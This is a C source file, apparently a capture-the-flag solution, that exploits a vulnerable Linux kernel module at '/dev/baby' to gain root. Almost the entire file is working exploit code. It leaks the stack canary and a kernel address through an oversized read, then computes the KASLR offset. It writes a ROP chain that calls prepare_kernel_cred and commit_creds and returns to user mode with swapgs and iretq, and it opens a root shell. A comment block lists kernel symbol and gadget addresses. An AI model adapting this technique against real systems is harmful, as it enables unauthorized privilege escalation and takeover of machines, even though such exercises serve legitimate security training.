#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <malloc.h>
#include <signal.h>
/*

No kpti

ffffffff81085fa0 T commit_creds
ffffffff810861d0 T prepare_kernel_cred

ffffffff81c00a6f T swapgs_restore_regs_and_return_to_usermode


ffffffff811ca660 T __vfs_read
ffffffff811ca690 T vfs_read
ffffffff811ca7e0 T kernel_read
ffffffff811ca820 T vfs_write
ffffffff811ca9b0 T kernel_write
ffffffff811ca9f0 T ksys_read
ffffffff811caac0 T __x64_sys_read
ffffffff811caad0 T __ia32_sys_read
ffffffff811caae0 T ksys_write

0xffffffff811ca727 leak1 ret to vfs_read
0xffffffff811caa4a leak2 ksys_read??


ffffffffc0000000 t baby_open    [baby]
ffffffffc0000023 t baby_release [baby]
ffffffffc0000046 t baby_read    [baby]
ffffffffc00000e7 t baby_write   [baby]
ffffffffc0000188 t baby_exit    [baby]
ffffffffc0000188 t cleanup_module       [baby]


0xffffffff81c00f0a: swapgs ; popfq ; ret ; (1 found)
0xffffffff8136476d: push rax ; xor eax, eax ; ret ; (9 found)
0xffffffff829f1b7e: push rax ; ret ; (143 found)
0xffffffff829c3834: pop rdi ; ret ; (7454 found)
0xffffffff829d15ca: iretq ; (98 found)
0xffffffff8119165a: xor rax, rax ; ret ; (23 found)

0xffffffff829c31f0: mov rdi, rax ; rep movsd ; ret ; (1 found)
0xffffffff8101bbfb: mov rdi, rax ; rep movsq ; ret ; (1 found)

0xffffffff829df39b: pop rcx ; ret ; (1 found)
0xffffffff829e21b9: pop rcx ; ret ; (1 found)
0xffffffff82a36052: pop rcx ; ret ; (1 found)
0xffffffff81050d76: pop rcx ; ret ; (1 found)
0xffffffff8118737a: pop rcx ; ret ; (1 found)
0xffffffff8118856c: pop rcx ; ret ; (1 found)
0xffffffff811a0222: pop rcx ; ret ; (1 found)
0xffffffff811a0251: pop rcx ; ret ; (1 found)
0xffffffff811a0291: pop rcx ; ret ; (1 found)

0xffffffff8100279a: pop rdi ; ret ; (1 found)
0xffffffff81004b82: pop rdi ; ret ; (1 found)
0xffffffff81004fed: pop rdi ; ret ; (1 found)
0xffffffff810055c7: pop rdi ; ret ; (1 found)
0xffffffff810058f6: pop rdi ; ret ; (1 found)
0xffffffff81005cb4: pop rdi ; ret ; (1 found)
0xffffffff81006eb7: pop rdi ; ret ; (1 found)
0xffffffff81007349: pop rdi ; ret ; (1 found)
0xffffffff8100735e: pop rdi ; ret ; (1 found)
0xffffffff81008bbc: pop rdi ; ret ; (1 found)
0xffffffff81008bee: pop rdi ; ret ; (1 found)

0xffffffff810003dc: iretq ; (1 found)
0xffffffff81022f42: iretq ; (1 found)
0xffffffff81023349: iretq ; (1 found)
0xffffffff81024b96: iretq ; (1 found)
0xffffffff81034543: iretq ; (1 found)
0xffffffff81034dfa: iretq ; (1 found)
0xffffffff81043eb2: iretq ; (1 found)
0xffffffff81077eb0: iretq ; (1 found)
0xffffffff8108a197: iretq ; (1 found)
0xffffffff810a46ee: iretq ; (1 found)


*/

size_t swapgs_popfq_ret = 0xffffffff81c00f0a;
size_t iretq = 0xffffffff81022f42;
size_t leak1 = 0xffffffff811ca727;

size_t xor_rax_rax_ret = 0xffffffff8119165a;
size_t pop_rdi_ret = 0xffffffff8100279a;
size_t mov_rdi_rax_rep_ret = 0xffffffff8101bbfb;
size_t pop_rcx_ret = 0xffffffff81050d76;

size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00a6f;
void print_bytes(const unsigned char *payload, size_t size) {
    // Loop through the payload in chunks of 8 bytes
    for (size_t i = 0; i < size; i++) {
        // Print the current byte in hexadecimal format
        printf("%02x ", payload[i]);

        // Print a newline after every 8 bytes
        if ((i + 1) % 8 == 0) {
            printf("\n");
        }
    }

    // If the number of bytes is not a multiple of 8, print a final newline
    if (size % 8 != 0) {
        printf("\n");
    }
}


size_t commit_creds = 0xffffffff81085fa0, prepare_kernel_cred = 0xffffffff810861d0;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus()
{
    __asm__(
    	    ".intel_syntax noprefix;"
    	    "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void getRootPrivilige(void)
{
    void * (*prepare_kernel_cred_ptr)(void *) = (void *)prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = (void*)commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

void getRootShell(void)
{   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    system("/bin/sh");
    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    
}


int main()
{
        saveStatus();
        printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");

    
	char * path = "/dev/baby";
	int fd = open(path, O_RDWR);
	assert(fd>0);
	
	char leak[800];
	int ret = read(fd, leak, 500);
	
	size_t offset = *(size_t*)(leak+408) - leak1;
	//print_bytes(leak, 500);
	size_t canary = *(size_t*)(leak+400) ;
	printf("\033[34m\033[1m[*] leak+408 = %llx\033[0m\n", *(size_t*)(leak+408));
	printf("\033[34m\033[1m[*] offset = %llx\033[0m\n", offset);
	printf("\033[34m\033[1m[*] canary = %llx\033[0m\n", canary);
	
	commit_creds+=offset;
	prepare_kernel_cred+=offset;
	
        //construct the ropchain
        size_t rop_chain[100], i = 0;
        for(; i < 51;i++)
             rop_chain[i] = canary;
             
	rop_chain[i++] = pop_rdi_ret + offset;
	rop_chain[i++] = 0;
	//rop_chain[i++] = pop_rdi_ret+ offset;
	rop_chain[i++] = prepare_kernel_cred;
	rop_chain[i++] = pop_rcx_ret+ offset;
	rop_chain[i++] = 0;
	rop_chain[i++] = mov_rdi_rax_rep_ret+ offset;
	
	rop_chain[i++] = commit_creds;
	rop_chain[i++] = swapgs_popfq_ret + offset;
	rop_chain[i++] = 0;

	rop_chain[i++] = iretq + offset;
	
	rop_chain[i++] = (size_t)getRootShell;
	rop_chain[i++] = user_cs;
	rop_chain[i++] = user_rflags;
	rop_chain[i++] = user_sp;
	rop_chain[i++] = user_ss;

/*   
  
        rop_chain[i++] = (size_t)getRootPrivilige;
	rop_chain[i++] = swapgs_popfq_ret + offset;
	rop_chain[i++] = 0;

	rop_chain[i++] = iretq + offset;
	rop_chain[i++] = (size_t)getRootShell;
	rop_chain[i++] = user_cs;
	rop_chain[i++] = user_rflags;
	rop_chain[i++] = user_sp;
	rop_chain[i++] = user_ss;
*/
	signal(SIGSEGV, (void (*)(int))getRootShell);
        
	write(fd, rop_chain, 70*8);	

	close(fd);
	return 0;

}
